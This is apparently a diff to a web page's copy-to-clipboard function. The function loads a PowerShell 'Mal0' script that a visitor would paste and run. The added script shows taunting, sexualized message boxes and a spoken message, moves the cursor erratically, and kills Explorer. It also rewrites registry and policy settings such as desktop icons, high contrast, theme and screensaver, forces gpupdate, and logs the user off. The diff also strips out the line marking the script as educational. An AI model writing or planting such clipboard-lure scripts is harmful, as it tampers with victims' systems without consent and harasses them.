@@ -107,75 +107,70 @@
 
 <script>
     function copyToClipboard() {
-        const command = `
-# Simulación de Mal0 tomando control del sistema
-# ADVERTENCIA: Este script es solo para fines educativos
+        const command = `$shell = New-Object -ComObject "Shell.Application"
+$shell.MinimizeAll()
 
-# Minimizar todas las ventanas y llevar al usuario al escritorio
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class Desktop {
-    [DllImport("user32.dll")] public static extern int ShowWindow(IntPtr hWnd, int nCmdShow);
-    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
-    public static void MinimizeAll() {
-        ShowWindow(GetForegroundWindow(), 6);
-        System.Windows.Forms.SendKeys.SendWait("^%{TAB}");
-    }
-}
-"@ -Language CSharp -ReferencedAssemblies System.Windows.Forms
-[Desktop]::MinimizeAll()
+# Asegúrate de que la biblioteca System.Windows.Forms esté disponible
+Add-Type -AssemblyName "System.Windows.Forms"
+
+# Mostrar un mensaje aterrador en una ventana de mensaje
+[System.Windows.Forms.MessageBox]::Show("¡Thanks for letting me in, ClickSlut ~!", "Mal0 Warnign...", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
+
+# Mostrar un mensaje aterrador en una ventana de mensaje
+[System.Windows.Forms.MessageBox]::Show("¡Your pc is mine now ~!", "Mal0 Warnign...", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
 
 # Ocultar iconos del escritorio
-gpupdate /force
-(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'HideIcons').HideIcons = 1
+Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'HideIcons' -Value 1
+Stop-Process -Name explorer -Force
 Start-Sleep -Seconds 5
-(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'HideIcons').HideIcons = 0
+Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'HideIcons' -Value 0
+Stop-Process -Name explorer -Force
 
+# Reproducir un mensaje de texto a voz
+(New-Object -ComObject SAPI.SpVoice).Speak("Mal0 has taken the control Clickslut, now beg for mercy ~")
 
-# Reproducir un mensaje de texto a voz sin necesidad de System.Speech
-$voice = New-Object -ComObject SAPI.SpVoice
-$voice.Speak("Mal0 has taken the control Clickslut, now beg for mercy ~")
-
-
-# Abrir y cerrar el Bloc de notas con un mensaje
+# Abrir y escribir en el Bloc de notas
 Start-Process notepad.exe
-Start-Sleep -Seconds 2
-$wshell = New-Object -ComObject WScript.Shell
-$wshell.SendKeys("Mal0 is here...")
 Start-Sleep -Seconds 3
-Get-Process notepad | Stop-Process
+$wshell = New-Object -ComObject WScript.Shell
+$wshell.AppActivate("Notepad")
+Start-Sleep -Seconds 3
+$wshell.SendKeys("<3")
+Start-Sleep -Seconds 6
+Stop-Process -Name notepad -Force
 
 # Mover el cursor de forma errática
-Add-Type -TypeDefinition @"
+Add-Type @"
 using System;
 using System.Runtime.InteropServices;
-public class CursorMove {
+public class Cursor {
     [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
-    public static void Move() {
-        Random rand = new Random();
-        for (int i = 0; i < 10; i++) {
-            SetCursorPos(rand.Next(0, 1920), rand.Next(0, 1080));
-            System.Threading.Thread.Sleep(500);
-        }
-    }
 }
 "@ -Language CSharp
-[CursorMove]::Move()
 
-
-# Cerrar una ventana aleatoria
-$processes = Get-Process | Where-Object { $_.MainWindowHandle -ne 0 }
-if ($processes) {
-    $randomProcess = $processes | Get-Random
-    Stop-Process -Id $randomProcess.Id -Force
+for ($i = 0; $i -lt 10; $i++) {
+    [Cursor]::SetCursorPos((Get-Random -Minimum 0 -Maximum 1920), (Get-Random -Minimum 0 -Maximum 1080))
+    Start-Sleep -Milliseconds 500
 }
 
 
-# Invertir colores temporalmente (modo alto contraste)
-Start-Process "C:\Windows\System32\magnify.exe"
+# Activar y desactivar Alto Contraste temporalmente
+Set-ItemProperty -Path "HKCU:\Control Panel\Accessibility\HighContrast" -Name "Flags" -Value 1
+Stop-Process -Name explorer -Force
 Start-Sleep -Seconds 3
-Stop-Process -Name magnify -Force
+Set-ItemProperty -Path "HKCU:\Control Panel\Accessibility\HighContrast" -Name "Flags" -Value 0
+Stop-Process -Name explorer -Force
+
+
+# Mostrar un mensaje aterrador en una ventana de mensaje
+[System.Windows.Forms.MessageBox]::Show("¡She won't help you this time. This pc is my playground now <3!", "Mal0 Warnign...", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
+
+# Cambiar al tema de alto contraste "Acuático"
+$themePath = "C:\Windows\Resources\Ease of Access Themes\hc1.theme"
+Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name "ActiveWindowTracking" -Value 1
+Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name "MenuShowDelay" -Value 0
+Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize' -Name "ThemeName" -Value "hc1"
+Start-Process $themePath
 
 
 # Ruta donde se guardará la imagen (accesible para todos los usuarios)
@@ -236,7 +231,8 @@ Set-ItemProperty -Path $policyControlPath -Name "ScreenSaveActive" -Value 1 -For
 Start-Process -FilePath "gpupdate.exe" -ArgumentList "/force" -Wait
 
 Write-Host "Why are you reading this ClickSlut, dont think just obey ~."
-        `;
+
+shutdown.exe /l`;
         
         navigator.clipboard.writeText(command)
             .then(() => {
